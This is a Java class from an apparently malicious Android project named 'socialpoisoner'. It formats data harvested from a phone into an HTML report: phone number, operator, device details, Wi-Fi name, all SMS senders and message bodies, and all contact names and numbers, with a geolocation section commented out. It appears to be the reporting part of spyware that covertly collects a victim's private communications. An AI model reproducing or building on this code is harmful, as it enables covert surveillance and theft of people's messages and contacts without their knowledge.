package com.cakeman.doctorrabb.socialpoisoner.modules;

import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by doctorrabb on 16.07.16.
 */

public class messageBuilder {

    private JSONObject jsonObject;

    public messageBuilder (JSONObject jsonObject) {
        this.jsonObject = jsonObject;
    }

    public String buildToHtml () {
        String html = "<img src='https://lh3.ggpht.com/04DjMWrG_qAyMBj_sMi4AlQgR5nHZAc_H9r7DwXU5MyH35mpUjHQZVYB0ylQJ9o7Qf4=w300'><h2>Device Information</h2>";

        try {
            JSONObject info = this.jsonObject.getJSONObject ("info");
            html += "<br><h3>Phone Number: " + info.getString ("phone_number") + "</h3>";
            html += "<br><h3>Mobile Operator: " + info.getString ("mobile_operator") + "</h3>";
            html += "<br><h3>Device Model: " + info.getString ("device_model") + "</h3>";
            html += "<br><h3>Android Version: " + info.getString ("android_version") + "</h3>";
            html += "<br><h3>Android Version Codename: " + info.getString ("android_version_codename") + "</h3>";

            html += "<br><h3>Wifi Hotspot Name: " + this.jsonObject.getString ("wifi") + "</h3>";

      /*      if (this.jsonObject.getJSONObject ("geo") != null) {

                html += "<br><br><br><h2>Geo Location</h2>";
                html += "<br><h3>Latitude: " + this.jsonObject.getJSONObject("geo").getString("latitude") + "</h3>";
                html += "<br><h3>Longitude: " + this.jsonObject.getJSONObject("geo").getString("longitude") + "</h3>";
            } */

        } catch (JSONException e) {
           Log.e ("!", "NO INFO");
        }

        html += "<br><br><br><h2>SMS Data</h2>";

        try {
            if (this.jsonObject.getJSONArray ("sms") != null) {
                    for (int i = 0; i < this.jsonObject.getJSONArray("sms").length(); i++) {
                        html += "<br><h3>" + this.jsonObject.getJSONArray("sms").getJSONObject(i).getString("address") + "</h3><h4>" + this.jsonObject.getJSONArray("sms").getJSONObject(i).getString("body") + "</h4>";
                    }

                    html += "<br><br><br><h2>Contacts</h2>";

                    for (int i = 0; i < this.jsonObject.getJSONArray("contacts").length(); i++) {
                        html += "<br><h3>" + this.jsonObject.getJSONArray("contacts").getJSONObject(i).getString("name") + "</h3><h4>" + this.jsonObject.getJSONArray("contacts").getJSONObject(i).getString("num") + "</h4>";
                    }
            }
        } catch (Exception e) {
            Log.e("To Json Error!", e.getMessage());
        }

        return html;
    }

}
